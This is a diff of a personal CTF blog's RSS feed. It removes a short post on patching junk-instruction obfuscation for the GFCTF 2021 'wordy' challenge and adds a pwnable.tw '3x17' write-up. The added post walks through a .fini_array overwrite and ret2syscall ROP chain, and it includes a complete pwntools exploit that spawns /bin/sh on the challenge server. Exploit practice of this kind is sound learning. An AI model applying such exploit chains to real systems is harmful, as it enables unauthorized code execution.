@@ -51,25 +51,6 @@
     </item>
     
     <item>
-      <title>Re Go Go Go!</title>
-      <link>http://example.com/2024/04/16/Re-Go-Go-Go/</link>
-      <guid>http://example.com/2024/04/16/Re-Go-Go-Go/</guid>
-      <pubDate>Tue, 16 Apr 2024 13:54:35 GMT</pubDate>
-      
-      <description>&lt;p&gt;记录一下开始学Re啦，先水一篇博客再说&lt;/p&gt;</description>
-      
-      
-      
-      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>记录一下开始学Re啦，先水一篇博客再说</p><span id="more"></span><p>写这篇博客是因为刚开始做Re题，遇到了一道挺有意思的题目，于是记录一下</p><p>因为平时一直在写pwn题，虽然一直在用ida，但是对ida的了解程度还是太低了，没想到ida有那么强大的功能，可以直接运行代码修改数据(我还是太菜了)</p><h5 id="GFCTF-2021-wordy"><a href="#GFCTF-2021-wordy" class="headerlink" title="[GFCTF 2021]wordy"></a>[GFCTF 2021]wordy</h5><p>这道题考的点很简单，就是一个花指令</p><p>本题的花指令是 0xEB 0xFF，所以把花指令nop掉就可以了</p><p>用ida打开，选择File-&gt;script command,然后输入如下代码就可以帮我们把所有的花指令都nop掉</p><p><img src="/imgs/$%7Bfiilename%7D/Re_GO_GO_GO-1.png"></p><p>运行后就可以看到很多字符，提取出来即可</p><p><img src="/imgs/$%7Bfiilename%7D/Re_GO_GO_GO-2.png"></p><p>然后flag就藏在这些字符里面</p>]]></content:encoded>
-      
-      
-      
-      
-      <comments>http://example.com/2024/04/16/Re-Go-Go-Go/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
       <title>栈迁移</title>
       <link>http://example.com/2024/03/27/%E6%A0%88%E8%BF%81%E7%A7%BB/</link>
       <guid>http://example.com/2024/03/27/%E6%A0%88%E8%BF%81%E7%A7%BB/</guid>
@@ -199,6 +180,25 @@
       
       
       <comments>http://example.com/2024/01/27/pwnable-hacknote/#disqus_thread</comments>
+      
+    </item>
+    
+    <item>
+      <title>pwnable-3x17</title>
+      <link>http://example.com/2024/01/26/pwnable-3x17/</link>
+      <guid>http://example.com/2024/01/26/pwnable-3x17/</guid>
+      <pubDate>Fri, 26 Jan 2024 10:52:51 GMT</pubDate>
+      
+      <description>&lt;p&gt;第一反应有点像之前做过的一道fmt漏洞，通过修改fini.array地址内容为mian地址达到无限次循环，这个题省略了fmt漏洞，让你可以直接修改地址内容，根据程序执行流程图，main函数执行完后会执行fini.array&lt;/p&gt;</description>
+      
+      
+      
+      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>第一反应有点像之前做过的一道fmt漏洞，通过修改fini.array地址内容为mian地址达到无限次循环，这个题省略了fmt漏洞，让你可以直接修改地址内容，根据程序执行流程图，main函数执行完后会执行fini.array</p><span id="more"></span><p>那么程序流程为</p><p>__libc_csu_init -&gt; .init_array -&gt;main -&gt; __libc_csu_fini  -&gt; .fini_array[1] -&gt;.fini_array[0]  </p><p>如果将fini_array[1]覆盖为main</p><p>fini_array[0]覆盖为__libc_csu_fini，那么就完成了无限循环</p><p>补充一点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在执行init.array时会依次调用</span><br><span class="line">.init_array[0] </span><br><span class="line">.init_array[1]</span><br><span class="line">...</span><br><span class="line">.init_array[n]</span><br><span class="line"></span><br><span class="line">而fini.array则是相反</span><br><span class="line">.fini_array[n] </span><br><span class="line">.fini_array[n-1] </span><br><span class="line">... </span><br><span class="line">.fini_array[0]</span><br></pre></td></tr></table></figure><p><img src="/imgs/$%7Bfiilename%7D/pwnable-3x17-1.jpg" alt="pwnable-3x17-1"></p><p>但是程序中有一个点要注意一下，每次byte_4B9330都会自增1，且当byte_4B9330为1的时候才可以写，不过问题不大，因为unsigned_int8的范围是0~255，只用循环多次就能回到1</p><p><img src="/imgs/$%7Bfiilename%7D/pwnable-3x17-2.png" alt="pwnable-3x17-2"></p><p>然后就是ret2syscall，最后要用leave ret执行shellcode</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdi =<span class="number">0x401696</span></span><br><span class="line">pop_rsi =<span class="number">0x406c30</span></span><br><span class="line">pop_rdx =<span class="number">0x446e35</span></span><br><span class="line">leave_ret =<span class="number">0x401c4b</span></span><br><span class="line">ret =<span class="number">0x401016</span></span><br><span class="line">mian_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_array =<span class="number">0x4B40F0</span></span><br><span class="line">fini =<span class="number">0x402960</span></span><br><span class="line">syscall =<span class="number">0x4022b4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ropchain</span>(<span class="params">addr,data</span>):</span><br><span class="line">    p.sendafter(<span class="string">b&quot;addr:&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    ropchain(fini_array,p64(fini)+p64(mian_addr))</span><br><span class="line">    ropchain(<span class="number">0x4b92e0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#bss</span></span><br><span class="line">    ropchain(fini_array+<span class="number">0x10</span>,p64(pop_rax)+p64(<span class="number">59</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x20</span>,p64(pop_rdi)+p64(<span class="number">0x4b92e0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x30</span>,p64(pop_rsi)+p64(<span class="number">0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x40</span>,p64(pop_rdx)+p64(<span class="number">0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x50</span>,p64(syscall))</span><br><span class="line">    ropchain(fini_array,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content:encoded>
+      
+      
+      
+      
+      <comments>http://example.com/2024/01/26/pwnable-3x17/#disqus_thread</comments>
       
     </item>
     
